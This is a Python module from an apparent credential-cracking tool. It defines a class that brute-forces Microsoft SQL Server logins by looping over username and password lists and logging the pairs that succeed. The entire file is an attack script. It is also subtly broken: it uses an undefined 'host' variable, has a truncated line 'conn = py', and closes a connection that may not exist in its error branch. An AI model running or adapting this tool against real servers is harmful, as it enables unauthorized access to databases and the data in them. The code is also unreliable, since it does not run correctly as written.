# coding: utf-8
import pymssql

from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("mssql")

service_name = "mssql"


class MssqlCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        super(MssqlCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 1433

    def run(self):
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            conn = pymssql.connect(host=host, port=self.port, user=username, password=password, connect_timeout=self.timeout)
            conn = py
            logging.info("brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            conn.close()
        finally:
            if not success:
                return
            conn.close()
            self.result.append({"username": username, "password": password})



